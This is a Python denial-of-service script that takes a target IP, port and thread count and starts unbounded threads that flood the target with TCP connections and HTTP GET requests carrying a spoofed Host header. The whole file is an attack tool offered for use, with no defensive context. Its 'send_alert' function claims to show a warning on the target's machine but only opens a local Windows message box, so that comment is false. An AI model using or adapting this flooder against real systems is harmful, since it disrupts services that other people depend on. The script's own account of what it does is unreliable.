import socket
import threading
import os
import time
import ctypes
from threading import Lock

target = input("Insert target's IP: ")
port = int(input("Insert port: "))
threads = int(input("Insert number of threads: "))
fake_ip = '44.197.175.168'
attack_delay = float(input("Insert delay between attacks (in seconds): "))

attack_num = 0
lock = Lock()

def send_alert():
    """
    Show an alert message on the target's system.
    """
    try:
        message = "Alert: Your port is being attacked!"
        ctypes.windll.user32.MessageBoxW(0, message, "Alert", 1)
        print("Alert sent to target IP.")
    except Exception as e:
        print(f"Error sending alert: {e}")

def attack():
    global attack_num

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(f"GET /{target} HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n".encode())
            s.close()
            attack_num += 1
            print(f"Attack number: {attack_num}")
            time.sleep(attack_delay)

            # Send alert to target IP after every 5 attacks
            with lock:
                if attack_num % 5 == 0:
                    send_alert()

        except Exception as e:
            print(f"Error: {e}")

os.system("cls" if os.name == "nt" else "clear")
print("ToolName")

for i in range(threads):
    thread = threading.Thread(target=attack)
    thread.start()